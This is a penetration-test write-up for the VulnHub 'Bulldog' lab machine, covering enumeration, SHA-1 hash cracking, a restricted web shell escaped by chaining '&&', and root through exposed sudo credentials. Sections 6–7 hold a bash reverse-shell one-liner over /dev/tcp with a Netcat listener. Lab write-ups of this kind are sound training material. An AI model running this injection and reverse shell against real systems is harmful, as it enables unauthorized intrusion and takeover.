# 📝 Penetration Testing Report

# 🎯 VulnHub — Bulldog

> **📌 Platform:** VulnHub  
> **🖥️ Lab Machine:** Bulldog  
> **💻 Attacking Machine:** Kali Linux  
> **🌐 Environment:** Oracle VirtualBox (Host-Only Network)

---

# 📖 Overview

The objective of this assessment was to perform a full penetration test against the **Bulldog** virtual machine.

The assessment followed a structured methodology, starting with host discovery and service enumeration, followed by web application analysis, credential recovery, initial access, shell stabilization, local enumeration, and privilege escalation.

The system was ultimately compromised and **root-level access** was obtained.

A key aspect of this assessment was following the information discovered at each stage and using it to determine the next attack vector rather than relying on random exploitation attempts.

---

# 💡 Skills Demonstrated

- 🌐 Network Reconnaissance
    
- 🔍 Service Enumeration
    
- 🌍 Web Enumeration
    
- 📂 Directory Enumeration
    
- 🔐 Credential Analysis
    
- 🔎 Hash Identification
    
- 🔑 Password Cracking
    
- 🐚 Web Shell Exploitation
    
- 🔄 Reverse Shell
    
- 🐧 Linux Enumeration
    
- 🔬 Binary Analysis
    
- ⬆️ Privilege Escalation
    
- 👑 Root Access
    
- 📝 Security Reporting
    

---

# 🖥️ Lab Architecture

```text
Kali Linux
      │
      │ Host-Only Network
      │
Bulldog
```

---

# 🛣️ Attack Chain

```text
Host Discovery
      │
      ▼
Service Enumeration
      │
      ▼
HTTP Enumeration
      │
      ▼
Directory Discovery
      │
      ▼
Developer Page Discovery
      │
      ▼
Password Hash Discovery
      │
      ▼
Hash Identification
      │
      ▼
Password Cracking
      │
      ▼
Web Shell Access
      │
      ▼
Command Restriction Bypass
      │
      ▼
Reverse Shell
      │
      ▼
Local Enumeration
      │
      ▼
Binary Analysis
      │
      ▼
Credential Discovery
      │
      ▼
Privilege Escalation
      │
      ▼
Root Access
```

---

# 🛰️ 1. Network Reconnaissance

## 🎯 Objective

Identify the target host within the isolated laboratory network.

## 🤔 Why this method?

Since the target was deployed in a VirtualBox Host-Only network, ARP scanning was used to identify active hosts.

```bash
sudo arp-scan -I eth1 192.168.96.0/24
```

The target host was identified as:

```text
192.168.96.22
```

### 🔎 Analysis

After identifying the target IP address, the next step was to determine which network services were exposed.

---

# 🔍 2. Initial Service Enumeration

## 🎯 Objective

Identify open ports, running services, and software versions.

## 🤔 Why this method?

Service enumeration provides an initial overview of the attack surface and allows potential attack vectors to be identified.

The following Nmap command was used:

```bash
sudo nmap -sV -A 192.168.96.22
```

The scan identified the following services:

|Port|Service|Version|
|---|---|---|
|23/tcp|SSH|OpenSSH 7.2p2|
|80/tcp|HTTP|WSGIServer 0.1 / Python 2.7.12|
|8080/tcp|HTTP|WSGIServer 0.1 / Python 2.7.12|

The web application was identified as:

```text
Bulldog Industries
```

### 🔎 Analysis

The two HTTP services on ports **80** and **8080** immediately appeared to be the most promising attack vectors.

Instead of focusing on SSH first, further enumeration of both web services was performed.

---

# 🔍 3. Extended Service Enumeration

## 🎯 Objective

Gather additional information about the HTTP and SSH services.

Separate Nmap enumeration was performed against the identified services.

The HTTP enumeration revealed:

```text
/robots.txt
/dev/
```

Supported HTTP methods were:

```text
GET
HEAD
OPTIONS
```

The same resources were identified on both ports **80** and **8080**.

The SSH service was also further enumerated, confirming:

```text
OpenSSH 7.2p2
```

and support for both:

```text
publickey
password
```

authentication methods.

### 🔎 Analysis

The discovery of `/dev/` was particularly interesting because development-related directories frequently contain debugging information, credentials, source code, or functionality that is not intended to be publicly accessible.

The next step was therefore to investigate both web applications in greater detail.

---

# 🌐 4. Web Application Enumeration

## 🎯 Objective

Identify hidden directories and potentially sensitive functionality.

Both HTTP services were enumerated separately.

### Port 80

```text
192.168.96.22:80
```

Discovered resources:

```text
/admin
/dev
/robots.txt
```

### Port 8080

```text
192.168.96.22:8080
```

Discovered resources:

```text
/admin
/dev
/robots.txt
```

The `/admin/` directory contained an authentication interface for administrators.

The `/dev/` directory contained a message intended for developers and provided functionality that could potentially result in web shell access after authentication.

The `robots.txt` file did not contain useful information for further exploitation.

### 🔎 Analysis

At this stage, `/dev/` became the primary target because it exposed functionality specifically related to development and potentially allowed command execution.

The next step was to inspect the page source and identify whether sensitive information was being exposed.

---

# 🔐 5. Credential Discovery

## 🎯 Objective

Identify valid credentials that could be used to authenticate to the development functionality.

## 🤔 Why this method?

Source-code analysis can reveal information that is not visible in the rendered web page, including credentials, hashes, API keys, or application configuration data.

During analysis of the `/dev/` page source, password hashes associated with application users were discovered.

A hash identification tool was used to determine the likely hashing algorithm.

```bash
hashid
```

The identified hash format was then used to configure John the Ripper.

```bash
john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The passwords for two users were successfully recovered.

### 🔎 Analysis

The combination of exposed password hashes and weak passwords allowed authentication to the application's development functionality.

This demonstrated how information disclosure can directly lead to credential compromise.

---

# 🐚 6. Web Shell Access

## 🎯 Objective

Obtain command execution on the target system.

After authenticating with the recovered credentials, a web shell was obtained under the user:

```text
nick
```

The web shell provided only a restricted set of commands:

```text
ifconfig
ls
echo
pwd
cat
rm
```

### 🔎 Analysis

The restricted command set initially prevented arbitrary command execution.

However, rather than attempting to bypass the restriction through a complex exploit, the shell behavior was analyzed to determine whether shell operators were interpreted.

The logical operator:

```text
&&
```

was accepted by the application.

This provided a way to execute an additional shell command.

A reverse shell was therefore attempted.

---

# 🔄 7. Reverse Shell

## 🎯 Objective

Upgrade the restricted web shell to an interactive system shell.

The following command was executed through the web shell:

```bash
ls && bash -c 'bash -i >&/dev/tcp/192.168.96.3/4444 0>&1'
```

A Netcat listener was started on the attacking machine:

```bash
nc -lvp 4444
```

A reverse connection was successfully received.

The resulting shell was associated with:

```text
django
```

### 🔎 Analysis

The reverse shell provided significantly more functionality than the original restricted web shell and allowed standard Linux enumeration to be performed.

The next step was therefore local enumeration.

---

# 🐧 8. Local Enumeration

## 🎯 Objective

Identify potential privilege escalation opportunities.

The filesystem and available application files were examined for configuration files, credentials, scripts, and executables that could provide elevated privileges.

During enumeration, an interesting directory was discovered containing a custom executable and information describing its intended functionality.

The executable appeared to allow authentication as a privileged user using a password.

The executable was analyzed using:

```bash
strings customPermissionApp
```

The output revealed a potential password associated with the privileged account.

### 🔎 Analysis

At this point, the assessment had identified a possible path to privilege escalation.

Instead of attempting kernel exploits or other complex techniques, the discovered application functionality was investigated first.

---

# ⬆️ 9. Privilege Escalation

## 🎯 Objective

Obtain root-level privileges.

Before executing privileged commands, the shell was upgraded to a fully interactive Bash session.

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

After obtaining a more functional shell, the discovered credentials were used to execute:

```bash
sudo /bin/bash
```

The command successfully spawned a root shell.

The current privileges were therefore elevated to:

```text
root
```

### 🔎 Analysis

Privilege escalation was possible because the custom application exposed information that allowed access to a command with elevated privileges.

No kernel-level exploit was required.

---

# 👑 10. Post Exploitation

## 🎯 Objective

Confirm complete compromise of the target system.

After obtaining root access, the root user's home directory was accessed.

A flag file was discovered, confirming successful completion of the laboratory machine.

### 🔎 Analysis

The final access level was:

```text
root
```

This confirmed complete control over the target operating system.

---

# ⚠️ Key Findings

|Finding|Risk|
|---|---|
|Sensitive password hashes exposed in web application source|🔴 Critical|
|Weak/recoverable user passwords|🔴 Critical|
|Development functionality exposed to unauthorized users|🟠 High|
|Restricted web shell susceptible to command injection through shell operators|🔴 Critical|
|Custom privileged application exposed sensitive credentials|🔴 Critical|
|Excessive sudo privileges|🔴 Critical|
|Outdated Python 2.7 environment|🟠 High|

---

# 🧠 Attack Path Analysis

The compromise was achieved through a sequence of individually identifiable weaknesses rather than a single vulnerability.

The attack chain was:

```text
Web Application
      │
      ▼
/dev/ Discovery
      │
      ▼
Password Hash Disclosure
      │
      ▼
Password Recovery
      │
      ▼
Web Shell
      │
      ▼
Command Restriction Bypass
      │
      ▼
Reverse Shell
      │
      ▼
Local Enumeration
      │
      ▼
Custom Privileged Application
      │
      ▼
Credential Discovery
      │
      ▼
Sudo Abuse
      │
      ▼
Root
```

Each stage was based on information obtained during the previous stage.

---

# ✅ Conclusion

The **Bulldog** machine demonstrated the importance of following a structured penetration testing methodology.

The initial attack vector was not immediately obvious. However, systematic enumeration of the web services led to the discovery of the development interface, which exposed password hashes. Recovering those credentials provided access to a restricted web shell.

The shell restriction was then bypassed through command chaining, allowing a reverse shell to be established. Further local enumeration revealed a custom privileged application that exposed credentials for an account with elevated sudo privileges.

The final compromise was therefore achieved through the combination of:

- 🔍 Thorough service enumeration
    
- 🌐 Web application analysis
    
- 🔐 Credential and hash analysis
    
- 🐚 Web shell exploitation
    
- 🔄 Reverse shell establishment
    
- 🐧 Local Linux enumeration
    
- 🔬 Custom binary analysis
    
- ⬆️ Privilege escalation
    

The most important lesson from this assessment is that **each piece of information discovered during enumeration can become the basis for the next stage of the attack**. Rather than relying on random exploitation, the attack path was built progressively from the evidence obtained during each phase of the assessment.